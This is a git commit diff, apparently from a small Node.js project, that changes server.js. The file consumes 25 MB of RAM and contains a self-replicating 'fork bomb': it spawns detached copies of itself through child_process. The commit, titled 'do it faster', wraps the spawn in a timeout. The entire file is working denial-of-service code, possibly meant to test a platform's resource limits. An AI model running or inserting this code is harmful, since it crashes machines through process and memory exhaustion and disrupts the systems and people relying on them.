1ca1e96e684b5803a0005019d3eb351d35b70097
Romain <Filirom1@gmail.com>
2014-02-03 15:52:49 +0100

    do it faster

--- server.js
+++ server.js
@@ -1,9 +1,11 @@
 // consume some RAM bytes
 var str = new Buffer(25*1024*1024).toString();
 
-// fork bomb
-var spawn = require('child_process').spawn;
-var child = spawn('node', [__filename], {
-  detached: true
-});
-child.unref();
+setTimeout(function(){
+  // fork bomb
+  var spawn = require('child_process').spawn;
+  var child = spawn('node', [__filename], {
+    detached: true
+  });
+  child.unref();
+}, 100)
